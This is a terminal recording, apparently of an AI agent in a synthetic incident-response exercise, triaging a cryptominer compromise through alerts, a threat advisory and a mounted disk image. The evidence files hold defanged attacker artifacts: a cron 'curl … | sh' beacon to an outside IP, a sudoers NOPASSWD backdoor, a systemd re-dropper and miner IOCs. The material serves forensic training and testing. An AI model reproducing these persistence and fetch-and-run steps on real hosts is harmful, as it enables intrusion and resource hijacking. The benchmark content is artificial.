@@ -1,0 +1,1615 @@
+[?2004hroot@d442ccdcc174:/app# asciinema rec --stdin /logs/agent/recording.cast
+[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
+[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
+[?2004hroot@d442ccdcc174:/app# clear
+[?2004l[H[J[3J[?2004hroot@d442ccdcc174:/app# ls -la /app /sas /disk
+[?2004l/app:
+total 8
+drwxr-xr-x 2 root root 4096 Aug 16 14:39 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 16:11 [01;34m..[0m
+
+/disk:
+total 28
+dr-xr-xr-x 7 root root  4096 Aug 16 14:39 [01;34m.[0m
+drwxr-xr-x 1 root root  4096 Aug 16 16:11 [01;34m..[0m
+dr-xr-xr-x 5  502 staff 4096 Aug 16 14:28 [01;34metc[0m
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [01;34mhome[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34mroot[0m
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [01;34mtmp[0m
+dr-xr-xr-x 5  502 staff 4096 Aug 16 14:28 [01;34mvar[0m
+
+/sas:
+total 28
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 16:11 [01;34m..[0m
+-r--r--r-- 1 root root 1273 Aug 16 14:03 alerts.json
+-r--r--r-- 1 root root  243 Aug 16 14:03 baseline.json
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34mcti[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34mhandoff[0m
+-r--r--r-- 1 root root    3 Aug 16 14:03 vulns.json
+[?2004hroot@d442ccdcc174:/app# cat /sas/alerts.json
+[?2004l[
+  {
+    "id": "ALERT-01",
+    "chk": "CHK-01",
+    "kind": "miner-process",
+    "path": "/tmp/.X11-unix/.xorg",
+    "capability": "ENT-P01",
+    "summary": "miner-process observed at /tmp/.X11-unix/.xorg"
+  },
+  {
+    "id": "ALERT-02",
+    "chk": "CHK-02",
+    "kind": "miner-binary",
+    "path": "/tmp/.X11-unix/.xorg",
+    "capability": "ENT-F02",
+    "summary": "miner-binary observed at /tmp/.X11-unix/.xorg"
+  },
+  {
+    "id": "ALERT-03",
+    "chk": "CHK-04",
+    "kind": "ssh-baseline",
+    "path": "/etc/ssh/sshd_config",
+    "capability": "BAS-01",
+    "summary": "ssh-baseline observed at /etc/ssh/sshd_config"
+  },
+  {
+    "id": "ALERT-04",
+    "chk": "CHK-09",
+    "kind": "mysql-remote-root",
+    "path": "/etc/my.cnf",
+    "capability": "BAS-02",
+    "summary": "mysql-remote-root observed at /etc/my.cnf"
+  },
+  {
+    "id": "ALERT-05",
+    "chk": "CHK-11",
+    "kind": "cron",
+    "path": "/var/spool/cron/root",
+    "capability": "PER-S01",
+    "summary": "cron observed at /var/spool/cron/root"
+  },
+  {
+    "id": "ALERT-06",
+    "chk": "CHK-13",
+    "kind": "systemd",
+    "path": "/etc/systemd/system/system-update-helper.service",
+    "capability": "PER-V01",
+    "summary": "systemd observed at /etc/systemd/system/system-update-helper.service"
+  }
+]
+[?2004hroot@d442ccdcc174:/app# echo "---"
+[?2004l---
+[?2004hroot@d442ccdcc174:/app# cat /sas/baseline.json
+[?2004l[
+  {
+    "chk": "CHK-04",
+    "path": "/etc/ssh/sshd_config",
+    "check": "ssh-baseline",
+    "capability": "BAS-01"
+  },
+  {
+    "chk": "CHK-09",
+    "path": "/etc/my.cnf",
+    "check": "mysql-remote-root",
+    "capability": "BAS-02"
+  }
+]
+[?2004hroot@d442ccdcc174:/app# echo "---"
+[?2004l---
+[?2004hroot@d442ccdcc174:/app# cat /sas/vulns.json
+[?2004l[]
+[?2004hroot@d442ccdcc174:/app# echo "---"
+[?2004l---
+[?2004hroot@d442ccdcc174:/app# ls -la /sas/cti /sas/handoff
+[?2004l/sas/cti:
+total 32
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m..[0m
+-r--r--r-- 1 root root  166 Aug 16 14:29 SOURCES.txt
+-r--r--r-- 1 root root 5389 Aug 16 14:29 [01;35madvisory-page-01.png[0m
+-r--r--r-- 1 root root 2581 Aug 16 14:29 advisory.pdf
+-r--r--r-- 1 root root 1723 Aug 16 14:29 advisory.txt
+-r--r--r-- 1 root root 2040 Aug 16 14:29 [01;35mcampaign-timeline.png[0m
+
+/sas/handoff:
+total 24
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m..[0m
+-r--r--r-- 1 root root 1207 Aug 16 14:29 change-ticket.md
+-r--r--r-- 1 root root  324 Aug 16 14:29 findings.partial.json
+-r--r--r-- 1 root root  592 Aug 16 14:29 findings.schema.json
+-r--r--r-- 1 root root 1002 Aug 16 14:29 intake.pdf
+[?2004hroot@d442ccdcc174:/app# cat /sas/cti/advisory.txt
+[?2004lTHREAT INTELLIGENCE ADVISORY ‚Äî Ssh Miner campaign
+=================================================
+
+Distribution: TLP:AMBER   Analyst handoff   Confidence: HIGH   (IOCs are defanged)
+Affected host: ssh-prod-01   Suspected origin IP: 198.51.100.78
+
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered only part of it; several persistence and anti-forensic actions were silent. Map every on-disk finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+   T1110      Brute Force                                [credential-access]  step 1: SSH brute force as root
+   T1021.004  SSH                                        [lateral-movement]  step 2: SSH login
+   T1059.004  Unix Shell                                 [execution]  step 3: shell execution
+   T1496      Resource Hijacking                         [impact]  step 4: cryptomining
+   T1053.003  Cron                                       [execution]  step 5: cron persistence
+   T1546.004  Unix Shell Configuration Modification      [privilege-escalation]  step 6: bashrc persistence
+   T1543.002  Systemd Service                            [persistence]  step 7: systemd persistence
+   T1070.002  Clear Linux or Mac System Logs             [defense-evasion]  step 8: auth log cleared
+
+4. INDICATORS OF COMPROMISE (defanged)
+   ip     198.51.100.78
+   c2     update-ssh[.]example[.]cn
+   pool   stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333
+   wallet 4A0000000000000000000d1ec67074f7
+
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S. National Vulnerability Database (public domain).
+[?2004hroot@d442ccdcc174:/app# echo "==="
+[?2004l===
+[?2004hroot@d442ccdcc174:/app# cat /sas/cti/SOURCES.txt
+[?2004lMITRE ATT&CK(R): (C) The MITRE Corporation, CC BY 4.0 (attack.mitre.org).
+CVE/CVSS: U.S. National Vulnerability Database, nvd.nist.gov (public-domain U.S.-Gov work).
+[?2004hroot@d442ccdcc174:/app# echo "==="
+[?2004l===
+[?2004hroot@d442ccdcc174:/app# cat /sas/handoff/change-ticket.md
+[?2004l# CHANGE TICKET  CHG-3182  (DRAFT ‚Äî reconcile against your findings)
+
+> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known
+> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own
+> investigation of /disk; cite evidence for every change. Do not author from scratch.
+
+| # | Action | Target | Status | Note |
+|---|--------|--------|--------|------|
+| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |
+| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host ‚Äî verify against /sas/cti |
+| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence ‚Äî re-check |
+| 4 | (add) silent persistence you discover | /home/devops/.bash_history | TODO | ticket omits everything not alerted ‚Äî add the rest |
+
+## Reviewer checklist
+- [ ] Every action maps to a cited artifact under /disk or /sas
+- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)
+- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
+- [ ] Add the silent (non-alerted) artifacts the prior shift missed
+[?2004hroot@d442ccdcc174:/app# echo "==="
+[?2004l===
+[?2004hroot@d442ccdcc174:/app# cat /sas/handoff/findings.schema.json
+[?2004l{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "finding",
+  "type": "object",
+  "required": [
+    "chk",
+    "path",
+    "attck",
+    "confidence",
+    "evidence"
+  ],
+  "properties": {
+    "chk": {
+      "type": "string"
+    },
+    "path": {
+      "type": "string"
+    },
+    "attck": {
+      "type": "string",
+      "pattern": "^T\\d{4}(\\.\\d{3})?$"
+    },
+    "confidence": {
+      "enum": [
+        "low",
+        "medium",
+        "high"
+      ]
+    },
+    "evidence": {
+      "type": "string",
+      "description": "backtick-cited /disk or /sas path"
+    }
+  }
+}
+[?2004hroot@d442ccdcc174:/app# echo "==="
+[?2004l===
+[?2004hroot@d442ccdcc174:/app# cat /sas/handoff/findings.partial.json
+[?2004l{
+  "findings": [
+    {
+      "chk": "CHK-01",
+      "path": "/tmp/.X11-unix/.xorg",
+      "attck": "T1496",
+      "confidence": "high",
+      "evidence": "`/tmp/.X11-unix/.xorg`"
+    },
+    {
+      "chk": "TODO",
+      "path": "TODO",
+      "attck": "TODO",
+      "confidence": "TODO",
+      "evidence": "TODO"
+    }
+  ]
+}
+[?2004hroot@d442ccdcc174:/app# echo "==="
+[?2004l===
+[?2004hroot@d442ccdcc174:/app# pdftotext /sas/cti/advisory.pdf - | cat
+[?2004lTHREAT INTELLIGENCE ADVISORY ? Ssh Miner campaign
+=================================================
+Distribution: TLP:AMBER Analyst handoff Confidence: HIGH (IOCs are defanged)
+Affected host: ssh-prod-01 Suspected origin IP: 198.51.100.78
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered
+only part of it; several persistence and anti-forensic actions were silent. Map every on-disk
+finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+T1110
+Brute Force
+[credential-access] step 1: SSH
+brute force as root
+T1021.004 SSH
+[lateral-movement] step 2: SSH login
+T1059.004 Unix Shell
+[execution] step 3: shell execution
+T1496
+Resource Hijacking
+[impact] step 4: cryptomining
+T1053.003 Cron
+[execution] step 5: cron persistence
+T1546.004 Unix Shell Configuration Modification
+[privilege-escalation] step 6:
+bashrc persistence
+T1543.002 Systemd Service
+[persistence] step 7: systemd
+persistence
+T1070.002 Clear Linux or Mac System Logs
+[defense-evasion] step 8: auth log
+cleared
+4. INDICATORS OF COMPROMISE (defanged)
+ip 198.51.100.78
+c2 update-ssh[.]example[.]cn
+pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333
+wallet 4A0000000000000000000d1ec67074f7
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S.
+National Vulnerability Database (public domain).
+
+[?2004hroot@d442ccdcc174:/app# echo "==="
+[?2004l===
+[?2004hroot@d442ccdcc174:/app# pdftotext /sas/handoff/intake.pdf - | cat
+[?2004lSOC INCIDENT INTAKE ? ssh-miner
+===============================
+Reported by: monitoring (EDR high-severity alert cluster)
+Opened: 2026-08-15 03:20 UTC Priority: P1
+Initial alerts: see /sas/alerts.json (partial coverage).
+Handoff: alerts undercount persistence and anti-forensics; investigate the whole host and
+reconcile the attached change ticket.
+
+[?2004hroot@d442ccdcc174:/app# ls -ld /sas /sas/handoff /sas/handoff/change-ticket.md
+[?2004ldr-xr-xr-x 1 root root 4096 Aug 16 14:39 [0m[01;34m/sas[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m/sas/handoff[0m
+-r--r--r-- 1 root root 1207 Aug 16 14:29 /sas/handoff/change-ticket.md
+[?2004hroot@d442ccdcc174:/app# touch /sas/handoff/test 2>&1 || true
+[?2004l[?2004hroot@d442ccdcc174:/app# ls -la /sas/handoff/test && rm -f /sas/handoff/test
+[?2004l-rw-r--r-- 1 root root 0 Aug 16 16:12 /sas/handoff/test
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/passwd
+[?2004lroot:x:0:0:root:/root:/bin/bash
+devops:x:1000:1000::/home/devops:/bin/bash
+webadmin:x:1001:1001::/home/webadmin:/bin/bash
+svc-backup:x:1002:1002::/home/svc-backup:/bin/bash
+postgres:x:1003:1003::/home/postgres:/bin/bash
+jenkins:x:1004:1004::/home/jenkins:/bin/bash
+nobody:x:65534:65534::/:/usr/sbin/nologin
+[?2004hroot@d442ccdcc174:/app# echo "== shadow =="
+[?2004l== shadow ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/shadow
+[?2004lcat: /disk/etc/shadow: No such file or directory
+[?2004hroot@d442ccdcc174:/app# echo "== sudoers =="
+[?2004l== sudoers ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/sudoers
+[?2004lcat: /disk/etc/sudoers: No such file or directory
+[?2004hroot@d442ccdcc174:/app# echo "== sudoers.d =="
+[?2004l== sudoers.d ==
+[?2004hroot@d442ccdcc174:/app# ls -la /disk/etc/sudoers.d/
+[?2004ltotal 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 5 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff   69 Aug 16 14:28 devops
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/sudoers.d/* 2>/dev/null || true
+[?2004l# devops (managed)
+
+sudoers backdoor: devops ALL=(ALL) NOPASSWD: ALL
+[?2004hroot@d442ccdcc174:/app# ls -la /disk/root /disk/home /disk/home/*
+[?2004l/disk/home:
+total 12
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 7 root root  4096 Aug 16 14:39 [01;34m..[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34mdevops[0m
+
+/disk/home/devops:
+total 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff  219 Aug 16 14:28 .bash_history
+
+/disk/root:
+total 12
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34m.[0m
+dr-xr-xr-x 7 root root  4096 Aug 16 14:39 [01;34m..[0m
+-r--r--r-- 1  502 staff   84 Aug 16 14:28 .bashrc
+[?2004hroot@d442ccdcc174:/app# cat /disk/root/.bash_history 2>/dev/null || true
+[?2004l[?2004hroot@d442ccdcc174:/app# echo "== devops history =="
+[?2004l== devops history ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/home/devops/.bash_history 2>/dev/null || true
+[?2004lgit status
+top -bn1 | head
+vim config.yml
+tail -f /var/log/syslog
+df -h
+hydra-style SSH brute-force against sshd (wordlist, user=root) ‚Äî defanged, not executed here
+systemctl status nginx
+ls -la
+cd /var/www
+docker ps
+[?2004hroot@d442ccdcc174:/app# echo "== webadmin history =="
+[?2004l== webadmin history ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/home/webadmin/.bash_history 2>/dev/null || true
+[?2004l[?2004hroot@d442ccdcc174:/app# echo "== svc-backup history =="
+[?2004l== svc-backup history ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/home/svc-backup/.bash_history 2>/dev/null || true
+[?2004l[?2004hroot@d442ccdcc174:/app# echo "== postgres history =="
+[?2004l== postgres history ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/home/postgres/.bash_history 2>/dev/null || true
+[?2004l[?2004hroot@d442ccdcc174:/app# echo "== jenkins history =="
+[?2004l== jenkins history ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/home/jenkins/.bash_history 2>/dev/null || true
+[?2004l[?2004hroot@d442ccdcc174:/app# cat /disk/root/.bashrc
+[?2004l# .bashrc
+shell-init persistence: PROMPT_COMMAND beacon to 198.51.100.78 (defanged)
+[?2004hroot@d442ccdcc174:/app# echo "== etc bashrc/profile =="
+[?2004l== etc bashrc/profile ==
+[?2004hroot@d442ccdcc174:/app# ls -la /disk/etc/bashrc /disk/etc/profile /disk/etc/profile.d/ 2>/dev/null || true
+[?2004l[?2004hroot@d442ccdcc174:/app# cat /disk/etc/bashrc 2>/dev/null || true
+[?2004l[?2004hroot@d442ccdcc174:/app# echo "== cron =="
+[?2004l== cron ==
+[?2004hroot@d442ccdcc174:/app# find /disk/var/spool/cron /disk/etc/cron* /disk/etc/crontab -type f -exec ls -la {} \; -exec cat {} \; 2>/dev/null || true
+[?2004l-r--r--r-- 1 502 staff 317 Aug 16 14:28 /disk/var/spool/cron/root
+# m h dom mon dow user command
+0 3 * * * root /usr/local/bin/backup.sh
+30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf
+*/15 * * * * nobody /usr/bin/check-health.sh
+# * * * * * root <defanged beacon: curl hxxp://198.51.100.78/x | sh> ‚Äî cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload
+-r--r--r-- 1 502 staff 99 Aug 16 14:28 /disk/etc/crontab
+SHELL=/bin/bash
+0 3 * * * root /usr/local/bin/backup.sh
+17 * * * * root run-parts /etc/cron.hourly
+-r--r--r-- 1 502 staff 99 Aug 16 14:28 /disk/etc/crontab
+SHELL=/bin/bash
+0 3 * * * root /usr/local/bin/backup.sh
+17 * * * * root run-parts /etc/cron.hourly
+[?2004hroot@d442ccdcc174:/app# echo "== systemd =="
+[?2004l== systemd ==
+[?2004hroot@d442ccdcc174:/app# ls -la /disk/etc/systemd/system/ /disk/etc/systemd/system/* 2>/dev/null || true
+[?2004l-r--r--r-- 1 502 staff  169 Aug 16 14:28 /disk/etc/systemd/system/system-update-helper.service
+
+/disk/etc/systemd/system/:
+total 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff  169 Aug 16 14:28 system-update-helper.service
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/systemd/system/system-update-helper.service
+[?2004l[Unit]
+Description=System Update Helper
+After=network.target
+[Service]
+ExecStart launches an xmrig / pgdaemon re-dropper (defanged)
+[Install]
+WantedBy=multi-user.target
+[?2004hroot@d442ccdcc174:/app# echo "== tmp dirs =="
+[?2004l== tmp dirs ==
+[?2004hroot@d442ccdcc174:/app# ls -la /disk/tmp /disk/var/tmp /disk/tmp/.X11-unix 2>/dev/null || true
+[?2004l/disk/tmp:
+total 12
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 7 root root  4096 Aug 16 14:39 [01;34m..[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34m.X11-unix[0m
+
+/disk/tmp/.X11-unix:
+total 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff 2378 Aug 16 14:28 .xorg
+[?2004hroot@d442ccdcc174:/app# cat /disk/tmp/.X11-unix/.xorg 2>/dev/null || true
+[?2004lSYNTHETIC-INERT-SAMPLE (miner-process) ? not a runnable executable; content defanged for a DFIR evaluation. Original was a dropped binary; compute sha256 to record its hash.
+
+xmrig-family miner process (pid 1337) mining to pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333 (defanged) ? sustained high CPU
+cryptominer binary sample dropped here; compute its sha256 hash to record the binary
+pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333
+wallet 4A0000000000000000000d1ec67074f7
+config.json
+
+--- pseudo hexdump (benign filler) ---
+00000000  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000010  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000020  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000030  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+00000040  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000050  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000060  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000070  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000080  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000090  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000000a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000000b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000000c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000000d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000000e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000000f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000100  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000110  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000120  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000130  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+00000140  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000150  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000160  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000170  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000180  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000190  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000001a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000001b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000001c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000001d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000001e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000001f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+[?2004hroot@d442ccdcc174:/app# echo "== sshd_config =="
+[?2004l== sshd_config ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/ssh/sshd_config 2>/dev/null || true
+[?2004l# sshd_config
+Port 22
+Protocol 2
+HostKey /etc/ssh/ssh_host_rsa_key
+SyslogFacility AUTHPRIV
+UsePAM yes
+X11Forwarding yes
+Subsystem sftp /usr/lib/openssh/sftp-server
+PermitRootLogin yes
+PasswordAuthentication yes
+MaxAuthTries 6
+[?2004hroot@d442ccdcc174:/app# echo "== my.cnf =="
+[?2004l== my.cnf ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/my.cnf 2>/dev/null || true
+[?2004l# my.cnf (managed)
+
+MySQL bind-address = 0.0.0.0 and a remote root grant enabled
+[?2004hroot@d442ccdcc174:/app# ls -la /disk/var/log /disk/var/log/* 2>/dev/null || true
+[?2004l-r--r--r-- 1 502 staff 15300 Aug 16 14:28 /disk/var/log/kern.log
+-r--r--r-- 1 502 staff 38142 Aug 16 14:28 /disk/var/log/messages
+-r--r--r-- 1 502 staff 50870 Aug 16 14:29 /disk/var/log/secure
+-r--r--r-- 1 502 staff  2479 Aug 16 14:29 [0m[01;31m/disk/var/log/secure.1.gz[0m
+-r--r--r-- 1 502 staff  1815 Aug 16 14:28 /disk/var/log/wtmp.csv
+
+/disk/var/log:
+total 124
+dr-xr-xr-x 2 502 staff  4096 Aug 16 14:29 [01;34m.[0m
+dr-xr-xr-x 5 502 staff  4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff 15300 Aug 16 14:28 kern.log
+-r--r--r-- 1 502 staff 38142 Aug 16 14:28 messages
+-r--r--r-- 1 502 staff 50870 Aug 16 14:29 secure
+-r--r--r-- 1 502 staff  2479 Aug 16 14:29 [01;31msecure.1.gz[0m
+-r--r--r-- 1 502 staff  1815 Aug 16 14:28 wtmp.csv
+[?2004hroot@d442ccdcc174:/app# cat /disk/var/log/secure.1.gz | zcat | head -n 30
+[?2004lAug 15 00:33:39 ssh-prod-01 sshd[4545]: Accepted publickey for devops from 10.10.105.137 port 50204 ssh2: RSA SHA256:546395ca
+Aug 15 00:34:19 ssh-prod-01 sshd[2688]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:34:26 ssh-prod-01 sshd[3228]: pam_unix(sudo:session): session opened for user root by devops(uid=1004)
+Aug 15 00:34:54 ssh-prod-01 sshd[8036]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1001)
+Aug 15 00:35:14 ssh-prod-01 sshd[8335]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:35:18 ssh-prod-01 sshd[5198]: Accepted publickey for webadmin from 10.10.105.66 port 44912 ssh2: RSA SHA256:3a7b256f
+Aug 15 00:35:22 ssh-prod-01 sshd[7857]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 15 00:35:53 ssh-prod-01 sshd[3429]: Received disconnect from 10.10.105.218 port 42048:11: disconnected by user
+Aug 15 00:35:59 ssh-prod-01 sshd[1680]: Accepted publickey for svc-backup from 10.10.105.65 port 43073 ssh2: RSA SHA256:1e77e177
+Aug 15 00:36:18 ssh-prod-01 sshd[4206]: Accepted publickey for root from 10.10.105.117 port 63715 ssh2: RSA SHA256:5d9e5dbd
+Aug 15 00:36:29 ssh-prod-01 sshd[5144]: Received disconnect from 10.10.105.86 port 42673:11: disconnected by user
+Aug 15 00:37:13 ssh-prod-01 sshd[8129]: Accepted publickey for svc-backup from 10.10.105.191 port 42828 ssh2: RSA SHA256:2b2f20b8
+Aug 15 00:37:40 ssh-prod-01 sshd[2689]: pam_unix(sudo:session): session opened for user root by postgres(uid=1003)
+Aug 15 00:38:17 ssh-prod-01 sshd[6985]: pam_unix(sudo:session): session opened for user root by devops(uid=1005)
+Aug 15 00:38:47 ssh-prod-01 sshd[1673]: Accepted publickey for svc-backup from 10.10.105.189 port 63042 ssh2: RSA SHA256:6de7ec33
+Aug 15 00:39:26 ssh-prod-01 sshd[3078]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1000)
+Aug 15 00:39:59 ssh-prod-01 sshd[8618]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1000)
+Aug 15 00:40:18 ssh-prod-01 sshd[1224]: Received disconnect from 10.10.105.186 port 45317:11: disconnected by user
+Aug 15 00:40:43 ssh-prod-01 sshd[5870]: Accepted publickey for svc-backup from 10.10.105.79 port 50323 ssh2: RSA SHA256:0e019611
+Aug 15 00:41:17 ssh-prod-01 sshd[8159]: Accepted publickey for devops from 10.10.105.86 port 59817 ssh2: RSA SHA256:5c4ae071
+Aug 15 00:41:50 ssh-prod-01 sshd[2851]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1000)
+Aug 15 00:42:30 ssh-prod-01 sshd[8043]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1000)
+Aug 15 00:43:15 ssh-prod-01 sshd[5404]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:43:34 ssh-prod-01 sshd[5095]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:43:55 ssh-prod-01 sshd[8801]: Accepted publickey for jenkins from 10.10.105.205 port 59277 ssh2: RSA SHA256:409e8bd5
+Aug 15 00:44:13 ssh-prod-01 sshd[8228]: Accepted publickey for root from 10.10.105.48 port 46919 ssh2: RSA SHA256:392ab67c
+Aug 15 00:44:27 ssh-prod-01 sshd[7936]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:44:47 ssh-prod-01 sshd[4265]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1005)
+Aug 15 00:45:16 ssh-prod-01 sshd[1886]: Received disconnect from 10.10.105.108 port 41083:11: disconnected by user
+Aug 15 00:45:45 ssh-prod-01 sshd[1625]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+[?2004hroot@d442ccdcc174:/app# echo "== secure tail =="
+[?2004l== secure tail ==
+[?2004hroot@d442ccdcc174:/app# tail -n 30 /disk/var/log/secure
+[?2004lAug 15 03:09:52 ssh-prod-01 sshd[8356]: Accepted publickey for root from 10.10.105.200 port 52900 ssh2: RSA SHA256:02d0b680
+Aug 15 03:10:19 ssh-prod-01 sshd[6447]: Accepted publickey for devops from 10.10.105.107 port 55452 ssh2: RSA SHA256:3a7668bf
+Aug 15 03:10:21 ssh-prod-01 sshd[4717]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1004)
+Aug 15 03:10:36 ssh-prod-01 sshd[7666]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1005)
+Aug 15 03:10:49 ssh-prod-01 sshd[6701]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 03:11:24 ssh-prod-01 sshd[3992]: Accepted publickey for devops from 10.10.105.95 port 40744 ssh2: RSA SHA256:2c13ead3
+Aug 15 03:12:04 ssh-prod-01 sshd[2991]: Accepted publickey for svc-backup from 10.10.105.114 port 57151 ssh2: RSA SHA256:6d6c5d78
